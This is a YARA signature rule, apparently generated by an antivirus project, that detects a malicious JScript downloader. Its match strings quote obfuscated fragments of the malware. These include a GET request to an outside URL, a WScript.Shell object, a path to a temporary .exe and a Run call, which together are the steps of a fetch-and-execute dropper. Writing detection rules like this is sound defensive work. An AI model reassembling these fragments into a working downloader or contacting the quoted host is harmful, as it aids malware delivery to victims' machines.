rule sig_20160330_893e3e52b27a7892c4b53d7f396a66c3 {
  meta:
    description = "datamaliciousorder - file 20160330_893e3e52b27a7892c4b53d7f396a66c3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "77d8d5391347cb53631a06b561c09de290ea89eceb087ff43065d90cc36acf16"

  strings:
    $s1  = "GW[QX](\"GET\", \"http://abnreview.com.au/j7dsa\", false);" fullword ascii
    $s2  = "var Z1 = function L() {return WScript[OF](\"WScript\"+\".Shell\");}(), C0 = 11;" fullword ascii
    $s3  = "function I(KO, GE){Z = Z * 1; return KO - GE;};" fullword ascii
    $s4  = "if (GW[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function UD(){return OW + \"\";};" fullword ascii
    $s6  = "function C() {return Z1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Bf6rjHioarCZ.ex\" + \"e\";};" fullword ascii
    $s7  = "function T(TS){Z1[\"Run\"](TS, Z, Z);};" fullword ascii
    $s8  = "function K() {return ((YC == true) && (YC == JC)) ? 1 : Z;};" fullword ascii
    $s9  = "function K0(SR) {var JD = (1, 2, 3, 4, 5, SR); return JD;};" fullword ascii
    $s10 = "return I(L0, B);" fullword ascii
    $s11 = "var PG = new this[\"Date\"]();" fullword ascii
    $s12 = "function JV()" fullword ascii
    $s13 = "function S(){return OF;};" fullword ascii
    $s14 = "function VO(){return 22;};" fullword ascii
    $s15 = "var J = false;" fullword ascii
    $s16 = "YC = true; " fullword ascii
    $s17 = "JC = true; " fullword ascii
    $s18 = "var YC = false;" fullword ascii
    $s19 = "var JC = false;" fullword ascii
    $s20 = "} catch(E){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}